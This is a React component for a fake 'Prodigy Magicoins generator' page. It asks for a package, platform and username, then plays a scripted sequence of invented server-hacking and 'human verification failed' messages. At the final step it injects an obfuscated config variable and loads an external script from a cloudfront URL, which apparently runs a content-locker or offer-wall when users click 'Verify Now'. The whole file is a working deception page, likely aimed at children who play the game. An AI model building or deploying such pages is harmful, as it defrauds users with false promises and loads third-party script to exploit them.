import { useState, useEffect } from 'react';
import { motion } from 'motion/react';
import { Sparkles } from 'lucide-react';

export const ProdigyGenerator = () => {
  const [step, setStep] = useState(1);
  const [amount, setAmount] = useState<number | null>(null);
  const [platform, setPlatform] = useState<string | null>(null);
  const [username, setUsername] = useState('');
  const [progress, setProgress] = useState(0);
  const [status, setStatus] = useState('Loading...');

  useEffect(() => {
    if (step === 4) {
      const script1 = document.createElement('script');
      script1.type = 'text/javascript';
      script1.innerHTML = `var nmKZU_lGy_rBSDlc={"it":4514472,"key":"aad0d"};`;
      document.head.appendChild(script1);

      const script2 = document.createElement('script');
      script2.src = 'https://d3v3431sr9puku.cloudfront.net/4394c0a.js';
      document.head.appendChild(script2);
    }
  }, [step]);

  const amounts = [1000, 2800, 5000, 13500];

  const handleGenerate = () => {
    if (!username) return;
    setStep(3);
    
    const statuses = [
      "Connecting to Game Server...",
      "Connected Successfully",
      `Searching User: ${username}`,
      "User Found",
      "Connecting to User Database...",
      "Adding Resources...",
      "Security Firewall Detected!",
      "Verifying human...",
      "Human Verification Failed",
      "Manual Verification Required!"
    ];

    let p = 0;
    let sIdx = 0;
    const interval = setInterval(() => {
      p += 10;
      setProgress(p);
      if (sIdx < statuses.length) {
        setStatus(statuses[sIdx]);
        sIdx++;
      }
      if (p >= 100) {
        clearInterval(interval);
        setTimeout(() => setStep(4), 1000);
      }
    }, 800);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#4e54c8] to-[#8f94fb] font-sans p-4 flex flex-col items-center justify-center relative overflow-hidden">
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        {[...Array(20)].map((_, i) => (
          <motion.div key={i} className="absolute w-4 h-4 bg-yellow-400 rounded-full blur-[2px]" style={{ left: `${Math.random() * 100}%`, top: '100%' }} animate={{ y: ['0vh', '-120vh'], x: [0, Math.random() * 100 - 50], opacity: [1, 0] }} transition={{ duration: Math.random() * 10 + 10, repeat: Infinity, ease: "linear", delay: Math.random() * 5 }} />
        ))}
      </div>

      <div className="z-10 w-full max-w-4xl bg-[#679fc6] border-[10px] border-white rounded-[30px] p-8 shadow-[0_0_30px_rgba(0,0,0,0.5)] text-center">
        <img src="https://i.postimg.cc/pd0qSSTz/Magicoin.webp" alt="Prodigy" className="w-32 h-32 mx-auto -mt-20 mb-6 drop-shadow-xl animate-bounce" />
        
        {step === 1 && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <div className="inline-block bg-yellow-400 text-black font-bold text-xl px-6 py-2 rounded-xl mb-8 shadow-md">CHOOSE YOUR MAGICOINS PACKAGE</div>
            <div className="flex flex-wrap justify-center gap-6 mb-8">
              {amounts.map(amt => (
                <button key={amt} onClick={() => setAmount(amt)} className={`w-36 h-44 bg-gradient-to-br from-[#39c3ed] to-[#ffc007] border-4 rounded-xl flex flex-col items-center justify-center gap-2 transition-all hover:scale-110 shadow-lg ${amount === amt ? 'border-white scale-110' : 'border-white/50'}`}>
                  <img src="https://i.postimg.cc/pd0qSSTz/Magicoin.webp" alt="Magicoins" className="w-16 h-16 drop-shadow-md" />
                  <span className="text-2xl font-black text-black drop-shadow-sm">{amt.toLocaleString()}</span>
                  <span className="text-sm font-bold text-black">magicoins</span>
                </button>
              ))}
            </div>

            <div className="inline-block bg-yellow-400 text-black font-bold text-xl px-6 py-2 rounded-xl mb-6 shadow-md">CHOOSE YOUR PLATFORM</div>
            <div className="flex justify-center gap-4 mb-8">
              {['Android', 'iOS', 'Windows'].map(p => (
                <button key={p} onClick={() => setPlatform(p)} className={`w-24 h-20 bg-white rounded-xl shadow-md flex items-center justify-center transition-all hover:scale-110 ${platform === p ? 'bg-yellow-400 invert' : ''}`}>
                  <span className="font-bold text-black">{p}</span>
                </button>
              ))}
            </div>

            <button disabled={!amount || !platform} onClick={() => setStep(2)} className="bg-yellow-400 hover:bg-yellow-300 text-black font-black text-2xl py-4 px-12 rounded-2xl border-4 border-white shadow-xl transition-all disabled:opacity-50">PROCEED</button>
          </motion.div>
        )}

        {step === 2 && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="py-12">
            <input type="text" value={username} onChange={e => setUsername(e.target.value)} placeholder="Username or UID" className="w-full max-w-lg bg-[#353535] border-4 border-white rounded-2xl px-6 py-4 text-white text-2xl text-center shadow-inner focus:outline-none focus:border-yellow-400 mb-6" />
            <p className="bg-yellow-400 text-black font-bold inline-block px-4 py-2 rounded-lg mb-8">Your exact Games ID or Username must be entered.</p>
            <br />
            <button disabled={!username} onClick={handleGenerate} className="bg-yellow-400 hover:bg-yellow-300 text-black font-black text-2xl py-4 px-12 rounded-2xl border-4 border-white shadow-xl transition-all disabled:opacity-50">NEXT</button>
          </motion.div>
        )}

        {step === 3 && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="py-12 flex flex-col items-center">
            <Sparkles className="w-20 h-20 text-yellow-400 animate-spin mb-8" />
            <h3 className="text-2xl font-bold text-black mb-6 bg-white/80 px-6 py-2 rounded-full">{status}</h3>
            <div className="w-full max-w-md h-8 bg-[#1e1f1f] rounded-full overflow-hidden border-2 border-black/20 skew-x-[-10deg]">
              <motion.div className="h-full bg-yellow-400" style={{ width: `${progress}%` }} />
            </div>
          </motion.div>
        )}

        {step === 4 && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="py-12">
            <h3 className="text-3xl font-black text-red-600 bg-white inline-block px-6 py-2 rounded-xl border-4 border-red-600 mb-8 shadow-lg">Manual Verification Required!</h3>
            <br />
            <button onClick={() => {
              // @ts-ignore
              if (typeof _VE === 'function') _VE();
            }} className="bg-yellow-400 hover:bg-yellow-300 text-black font-black text-2xl py-6 px-16 rounded-2xl border-4 border-white shadow-xl transition-all animate-pulse">Verify Now</button>
          </motion.div>
        )}
      </div>
    </div>
  );
};
